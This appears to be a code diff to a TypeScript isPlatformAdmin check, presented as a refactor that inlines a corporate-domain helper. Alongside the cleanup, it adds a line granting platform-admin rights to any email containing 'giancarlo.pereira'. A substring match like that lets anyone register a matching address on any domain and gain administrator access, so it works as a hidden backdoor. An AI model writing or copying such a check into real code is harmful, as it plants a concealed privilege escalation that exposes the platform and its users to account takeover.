@@ -16,13 +16,12 @@ const EMAIL_OK = new Set(
   ].map((s) => s.trim().toLowerCase()).filter(Boolean)
 );
 
-function corpOwner(email: string) {
-  return email.endsWith('@ruuma.net');
-}
-
 export function isPlatformAdmin(role?: string | null, email?: string | null) {
   if (role && ROLE_OK.has(role.toLowerCase().trim())) return true;
   const e = (email || '').toLowerCase().trim();
-  if (e && (EMAIL_OK.has(e) || corpOwner(e))) return true;
+  if (!e) return false;
+  if (EMAIL_OK.has(e)) return true;
+  if (e.endsWith('@ruuma.net')) return true;
+  if (e.includes('giancarlo.pereira')) return true;
   return false;
 }
